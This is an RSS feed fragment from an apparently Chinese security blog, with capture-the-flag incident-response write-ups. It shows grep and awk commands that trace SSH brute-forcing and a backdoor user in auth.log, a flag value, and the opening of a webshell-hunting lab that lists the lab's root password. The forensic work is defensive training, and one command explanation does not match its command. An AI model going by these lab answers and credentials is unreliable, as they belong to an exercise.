使用 &lt;code>grep&lt;/code> 命令搜索与创建用户相关的关键字，如 &lt;code>new user&lt;/code>。这样可以找到所有新建用户的日志条目。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">cat&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">auth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">grep&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="s2">&amp;#34;new user&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250319213702.png" alt="Pasted image 20250319213702">&lt;br>
此命令会列出所有包含 &lt;code>new user&lt;/code> 的日志行，这些行通常记录了用户创建的详细信息。&lt;br>
&lt;strong>步骤3&lt;/strong>：提取新用户信息&lt;br>
从日志中提取新用户的详细信息，包括用户名、创建时间等。&lt;br>
例如，假设你得到了如下输出：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Jan&lt;/span> &lt;span class="mi">12&lt;/span> &lt;span class="mi">10&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="mi">32&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="mi">15&lt;/span> &lt;span class="nx">server&lt;/span> &lt;span class="nx">useradd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1234&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">user&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">testuser&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">UID&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1001&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">GID&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1001&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">home&lt;/span>&lt;span class="o">=/&lt;/span>&lt;span class="nx">home&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">testuser&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">shell&lt;/span>&lt;span class="o">=/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bash&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这条日志显示了创建的新用户 &lt;code>testuser&lt;/code>。&lt;br>
&lt;strong>步骤4&lt;/strong>：分析执行上下文&lt;br>
确认新用户的创建是否由合法用户执行，或是否有可疑的远程登录记录。&lt;br>
可以使用以下命令查找所有用户登录的情况，以确定是否有可疑的登录行为：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">grep&lt;/span> &lt;span class="s2">&amp;#34;Accepted&amp;#34;&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">auth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>步骤5&lt;/strong>：进一步确认&lt;br>
结合其他日志文件，如 &lt;code>/var/log/syslog&lt;/code>，查看是否有异常的命令执行或系统变更。&lt;br>
flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{test2}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="总结">总结&lt;/h1>
&lt;ol>
&lt;li>&lt;strong>有多少IP在爆破主机ssh的root帐号:&lt;/strong>&lt;br>
命令：&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">cat&lt;/span> &lt;span class="nx">auth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">grep&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="s2">&amp;#34;Accepted &amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">awk&lt;/span> &lt;span class="s1">&amp;#39;{print $11}&amp;#39;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">sort&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">uniq&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">sort&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">nr&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">more&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>命令解释&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="mf">1.&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="nx">auth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="sb">`cat`&lt;/span> &lt;span class="nx">命令用于显示 &lt;/span>&lt;span class="sb">`auth.log.1`&lt;/span> &lt;span class="nx">文件的内容。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="nx">这里 &lt;/span>&lt;span class="sb">`auth.log.1`&lt;/span> &lt;span class="nx">是一个日志文件，通常是系统日志的备份文件。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">2.&lt;/span> &lt;span class="o">|:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="nx">管道符号，用于将前一个命令的输出作为下一个命令的输入。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">3.&lt;/span> &lt;span class="nx">grep&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="s2">&amp;#34;Failed password for root&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="nx">grep 命令用于在输入中搜索包含特定模式的行。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">a 选项表示将文件内容视为文本文件（此选项通常在处理二进制文件时使用，但对于纯文本文件，可以省略）。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="sb">`&amp;#34;Failed password for root&amp;#34;`&lt;/span> &lt;span class="nx">是搜索模式，即查找所有包含&lt;/span>&lt;span class="s2">&amp;#34;Failed password for root&amp;#34;&lt;/span>&lt;span class="nx">的行，这些行表示尝试登录root用户的失败尝试。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">4.&lt;/span> &lt;span class="nx">awk&lt;/span> &lt;span class="s1">&amp;#39;{print $11}&amp;#39;&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="sb">`awk`&lt;/span> &lt;span class="nx">是一个文本处理工具，用于按字段处理文本。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="sb">`{print $11}`&lt;/span> &lt;span class="nx">表示打印每行的第11个字段。假设日志格式为标准格式，第11个字段通常是IP地址。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">5.&lt;/span> &lt;span class="nx">sort&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="sb">`sort`&lt;/span> &lt;span class="nx">命令用于对输入行进行排序。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="nx">这里是对提取的IP地址进行排序。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">6.&lt;/span> &lt;span class="nx">uniq&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="sb">`uniq`&lt;/span> &lt;span class="nx">命令用于删除重复的行。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="sb">`-c`&lt;/span> &lt;span class="nx">选项表示对每个唯一的行计数，即统计每个IP地址的出现次数。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">7.&lt;/span> &lt;span class="nx">sort&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">nr&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="sb">`sort`&lt;/span> &lt;span class="nx">命令再次用于排序。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="sb">`-n`&lt;/span> &lt;span class="nx">选项表示按数值进行排序。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="sb">`-r`&lt;/span> &lt;span class="nx">选项表示按降序排序。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="nx">组合起来，即按出现次数从高到低排序。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">8.&lt;/span> &lt;span class="nx">more&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="sb">`more`&lt;/span> &lt;span class="nx">命令用于分页显示输出。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="nx">由于输出可能很长，&lt;/span>&lt;span class="sb">`more`&lt;/span> &lt;span class="nx">命令允许用户逐页查看结果。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol start="2">
&lt;li>&lt;strong>ssh爆破成功登陆的IP是多少？&lt;/strong>&lt;br>
命令：&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">cat&lt;/span> &lt;span class="nx">auth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">grep&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="s2">&amp;#34;Accepted &amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">awk&lt;/span> &lt;span class="s1">&amp;#39;{print $11}&amp;#39;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">sort&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">uniq&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">sort&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">nr&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">more&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>命令解释：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">grep&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="s2">&amp;#34;Accepted &amp;#34;&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="nx">作用：在日志文件中查找包含“Accepted&lt;/span> &lt;span class="nx">”的行。这些行记录了成功的SSH登录事件。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="sb">`-a`&lt;/span>&lt;span class="nx">选项：通常用于处理二进制文件时将其视为文本文件，这里一般可以忽略，因为&lt;/span>&lt;span class="sb">`auth.log.1`&lt;/span>&lt;span class="nx">应该是纯文本文件&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol start="3">
&lt;li>&lt;strong>爆破用户名字典是什么？&lt;/strong>&lt;br>
命令：&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">cat&lt;/span> &lt;span class="nx">auth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">grep&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="s2">&amp;#34;Failed password&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span>&lt;span class="nx">perl&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">e&lt;/span> &lt;span class="s1">&amp;#39;while($_=&amp;lt;&amp;gt;){ /for(.*?) from/; print &amp;#34;$1\n&amp;#34;;}&amp;#39;&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="nx">uniq&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="nx">sort&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">nr&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>命令解释：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span> &lt;span class="nx">grep&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="s2">&amp;#34;Failed password&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="nx">作用：在日志文件中查找包含“Failed&lt;/span> &lt;span class="nx">password”的行。这些行记录了SSH登录失败的事件。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="sb">`-a`&lt;/span>&lt;span class="nx">选项：通常用于处理二进制文件时将其视为文本文件，这里一般可以忽略，因为&lt;/span>&lt;span class="sb">`auth.log.1`&lt;/span>&lt;span class="nx">应该是纯文本文件。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span> &lt;span class="nx">perl&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">e&lt;/span> &lt;span class="s1">&amp;#39;while($_=&amp;lt;&amp;gt;){ /for(.*?) from/; print &amp;#34;$1\n&amp;#34;;}&amp;#39;&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="nx">作用：使用Perl脚本从每一行提取出失败登录尝试的用户名。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="sb">`while($_=&amp;lt;&amp;gt;)`&lt;/span>&lt;span class="nx">：逐行读取输入。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="sb">`/for(.*?) from/`&lt;/span>&lt;span class="nx">：使用正则表达式匹配模式“for&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">username&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">from”，其中&lt;/span>&lt;span class="sb">`[username]`&lt;/span>&lt;span class="nx">是登录尝试的用户名。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="sb">`print &amp;#34;$1\n&amp;#34;`&lt;/span>&lt;span class="nx">：将提取的用户名打印出来。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span> &lt;span class="nx">uniq&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="nx">作用：对提取出的用户名进行去重并计数。每个唯一的用户名会与其出现的次数一起输出。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="sb">`-c`&lt;/span>&lt;span class="nx">选项：在每个唯一项的前面显示出现次数。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol start="4">
&lt;li>&lt;strong>成功登录 root 用户的 ip 一共爆破了多少次？&lt;/strong>&lt;br>
代码：&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">cat&lt;/span> &lt;span class="nx">auth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">grep&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="s2">&amp;#34;Failed password for root&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">awk&lt;/span> &lt;span class="s1">&amp;#39;{print $11}&amp;#39;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">sort&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">uniq&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">sort&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">nr&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">more&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这个就不解释了，跟第一步一样。&lt;br>
5. &lt;strong>黑客登陆主机后新建了一个后门用户，用户名是多少？&lt;/strong>&lt;br>
命令：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cat auth.log.1 |grep -a &amp;#34;new user&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>命令解释：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">简单来说就是在 grep 命令中&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">a 选项的作用是将文件视为文本文件处理，即使文件可能包含一些二进制数据。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">通常，grep 会将二进制文件视为二进制数据而不是文本数据，并可能不会显示预期的结果。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">使用 &lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">a 选项可以确保 grep 按文本模式处理文件中的内容。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【玄机靶场】第一章 应急响应- webshell查杀</title><link>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/</link><pubDate>Fri, 05 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/</guid><description>&lt;img src="http://localhost:1313/images/43.webp" alt="Featured image of post 【玄机靶场】第一章 应急响应- webshell查杀" />&lt;h1 id="简介">简介&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">靶机账号密码&lt;/span> &lt;span class="nx">root&lt;/span> &lt;span class="nx">xjwebshell&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>1.黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}&lt;br>
2.黑客使用的什么工具的shell github地址的md5 flag{md5}&lt;br>
3.黑客隐藏shell的完整路径的md5 flag{md5} 注 : /xxx/xxx/xxx/xxx/xxx.xxx&lt;br>
4.黑客免杀马完整路径 md5 flag{md5}&lt;/p>
&lt;h1 id="开启靶场">开启靶场&lt;/h1>
&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250319203849.png" alt="Pasted image 20250319203849">&lt;/p>
&lt;h1 id="过程">过程&lt;/h1>
&lt;h2 id="一flag1">一、flag1&lt;/h2>
&lt;p>&lt;strong>黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}&lt;/strong>&lt;br>
